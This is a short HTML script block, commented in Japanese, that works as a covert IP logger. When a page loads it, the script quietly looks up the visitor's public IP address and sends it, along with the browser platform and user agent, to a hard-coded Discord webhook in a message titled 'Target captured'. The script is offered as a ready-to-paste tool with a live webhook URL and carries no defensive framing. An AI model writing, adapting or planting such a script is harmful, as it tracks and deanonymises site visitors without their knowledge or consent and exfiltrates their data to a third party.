<script type="text/javascript">
(function() {
    // 1. ここに新しいWebhook URLをそのまま貼り付ける
    const w = "https://discord.com/api/webhooks/1480858959148486698/rogRAjEJV4UBPNPuq6vCS1mI44C77w771WdB7RWqh696LK9IOP654SsfT1zIXjaVGF87";

    // 2. IPと情報を取得して送信
    fetch('https://api.ipify.org?format=json')
    .then(r => r.json())
    .then(data => {
        const payload = {
            embeds: [{
                title: "🚨 ターゲット捕捉",
                color: 16711680,
                fields: [
                    { name: "IPアドレス", value: data.ip },
                    { name: "OS/Platform", value: navigator.platform },
                    { name: "User-Agent", value: navigator.userAgent }
                ],
                timestamp: new Date()
            }]
        };

        return fetch(w, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
    })
    .catch(e => console.error("Error:", e));
})();
</script>
